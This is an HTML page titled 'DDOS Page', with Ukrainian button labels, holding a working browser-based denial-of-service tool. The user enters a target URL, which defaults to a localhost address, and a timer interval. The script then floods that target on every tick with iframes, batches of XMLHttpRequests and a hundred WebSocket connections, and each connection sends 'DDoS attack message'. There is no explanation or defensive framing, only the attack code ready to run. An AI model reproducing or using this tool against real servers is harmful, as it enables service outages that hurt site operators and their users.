<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DDOS Page</title>
</head>
<body>
    <section>
        <input type="text" id="serverUrlInput" value="http://localhost/mski48">
		<input type="number" id="interval" value="1000">
		<button onclick="startXMLHttpRequest()">Почати відправку запитів</button>
		<button id="stopButton">Зупинити відправку запитів</button>
	</section>
	<script>
	let isActive = false;
	function startXMLHttpRequest() {
		
		var serverUrl = document.getElementById('serverUrlInput').value;
		var interval = document.getElementById('interval').value;
		
		if(!isActive) {
			var interval1 = setInterval(function() {
				sendIFrameRequests(serverUrl); // iFrame атака
				sendMultipleRequests(serverUrl); // XHR атака
				sendWebSocketRequest(serverUrl); // WebSocket атака
			}, interval);
			
			isActive = true;
		}

		document.getElementById('stopButton').addEventListener('click', function() {
			isActive = false;
			clearInterval(interval1);
		});
		
	}
	
	function sendIFrameRequests(serverUrl) {
		var iframe = document.createElement('iframe');
		iframe.src = serverUrl;
		document.body.appendChild(iframe);
		
		var iframes = document.querySelectorAll('iframe');
		if(iframes.length > 5) {
			for (var j = 0; j < iframes.length; j++) {
				document.body.removeChild(iframes[j]);
			}
		}
	}
	
	function sendMultipleRequests(serverUrl) {
		for (var i = 0; i < 10; i++) {
			var xhr = new XMLHttpRequest();
			xhr.open('GET', serverUrl, true);
			xhr.send();
		}
	}
	
	function sendWebSocketRequest(serverUrl) {
		for (var i = 0; i < 100; i++) {
			var socket = new WebSocket(convertToWebSocketUrl(serverUrl));

			socket.onopen = function() {
				socket.send('DDoS attack message');
			};

			socket.onerror = function(error) {
				console.error('WebSocket error:', error);
			};

			socket.onclose = function(event) {
				console.log('WebSocket closed:', event.code, event.reason);
			};
		}
	}
	
	function convertToWebSocketUrl(serverUrl) {
		if (serverUrl.startsWith('https://')) {
			var wssUrl = serverUrl.replace(/^https:\/\//, 'wss://');
			return wssUrl;
		} if (serverUrl.startsWith('http://')) {
			var wsUrl = serverUrl.replace(/^http:\/\//, 'ws://');
			return wsUrl;
		} else {
			return serverUrl;
		}
	}
	</script>
</body>
</html>
